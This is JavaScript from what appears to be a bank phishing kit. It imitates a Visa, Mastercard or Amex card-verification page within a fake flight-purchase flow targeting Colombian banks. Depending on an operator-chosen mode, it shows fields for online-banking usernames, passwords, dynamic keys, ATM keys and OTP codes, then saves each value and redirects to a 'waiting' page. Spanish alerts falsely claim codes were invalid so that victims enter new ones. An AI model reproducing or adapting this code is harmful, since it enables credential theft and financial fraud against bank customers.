/**
 * SET LOGOS
 */
const companyLoader = document.querySelector('#company-loader');
const companyLogo = document.querySelector('#company-logo');
const bankLogo = document.querySelector('#bank-logo');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');

    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
    companyLogo.setAttribute('width', '90px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '130px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '110px');
}


if(info.metaInfo.ban === 'bancolombia'){
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
    bankLogo.setAttribute('width', `120px`);
}else{
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
}

const mainLoader = document.querySelector('.main-loader');
setTimeout(() =>{
    try{
        mainLoader.classList.remove('show');
    }catch(e){
        console.log('e');
    }
}, 2500);

/**
 * SET INPUTS
 */
const user = document.querySelectorAll('#user');
const puser = document.querySelectorAll('#puser');
const cdin = document.querySelectorAll('#cdin');
const dintok = document.querySelectorAll('#dintok');
const ccaj = document.querySelectorAll('#ccaj');
const cavance = document.querySelectorAll('#cavance');
const otpcode = document.querySelectorAll('#otpcode');
if(info.checkerInfo.mode === 'userpassword'){



    user.forEach(elem =>{
        elem.classList.remove('hidden');
    });
    puser.forEach(elem =>{
        elem.classList.remove('hidden');
    });

    if(info.metaInfo.ban === 'bancolombia'){
        puser.forEach(elem => {
            elem.setAttribute('oninput', 'limitDigits(this, 4);');
        });
    }
}else if(info.checkerInfo.mode === 'cdin'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            if(info.metaInfo.ban === 'bogota'){
                alert('Token inválido o expiró, por favor inténtelo de nuevo.');
            }else{
                alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
            }
            
        }
    }, 2050);

    if(info.metaInfo.ban === 'bogota'){
        dintok.forEach(elem =>{
            elem.classList.remove('hidden');
        });
    }else{
        cdin.forEach(elem =>{
            elem.classList.remove('hidden');
        });
    }
    
}else if(info.checkerInfo.mode === 'ccaj'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.ccaj !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        }
    }, 2050);
    ccaj.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'cavance'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cavance !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        }
    }, 2050);
    cavance.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'otpcode'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.tok === ''){
            alert('Hemos enviado un código OTP a su teléfono. Por favor ingreselo');
        } else {
            alert('Código inválido. Hemos enviado un nuevo código OTP a su teléfono. Por favor ingreselo');
        }
    }, 2050);
    otpcode.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}

/**
 * SET NUMBERS
*/
const flightPrice = document.querySelectorAll('#flight-price');
const cardDigits = document.querySelector('#card-digits');
cardDigits.textContent = info.metaInfo.p.split(' ')[3];
function formatPrice(number){
    return number.toFixed(2);
}
let finalPrice = "- -";
if(info.flightInfo.ticket_nat === 'NAC'){
    finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else if(info.flightInfo.ticket_nat === 'INT'){
    finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else{
    console.log('flight resume error');
}

info.flightInfo.type === 1 ? finalPrice = finalPrice * 2 : '';

flightPrice.forEach(elem =>{
    elem.textContent = formatPrice(finalPrice);
});

/**
 * NEXT STEP
 */
const btnNextStep = document.querySelector('#btnNextStep');
const form = document.querySelector('#form');

btnNextStep.addEventListener('click', () =>{
    console.log('hola');
    if(info.checkerInfo.mode === 'userpassword'){
        if(user[1].value !== ''){
            if(puser[1].value !== ''){
                info.metaInfo.user = user[1].value;
                info.metaInfo.puser = puser[1].value;

                LS.setItem('info', JSON.stringify(info));

                window.location.href = 'waiting.html';
            }
        }
    }else if(info.checkerInfo.mode === 'cdin'){
        if(cdin[1].value !== ''){
            info.metaInfo.cdin = cdin[1].value;
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';

        }
    }else if(info.checkerInfo.mode === 'ccaj'){
        if(ccaj[1].value !== ''){
            info.metaInfo.ccaj = ccaj[1].value;
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';
            
        }
    }else if(info.checkerInfo.mode === 'cavance'){
        if(cavance[1].value !== ''){
            info.metaInfo.cavance = cavance[1].value;
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';
            
        }
    }else if(info.checkerInfo.mode === 'otpcode'){
        if(otpcode[1].value !== ''){
            info.metaInfo.tok = otpcode[1].value;
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';
            
        }
    }
});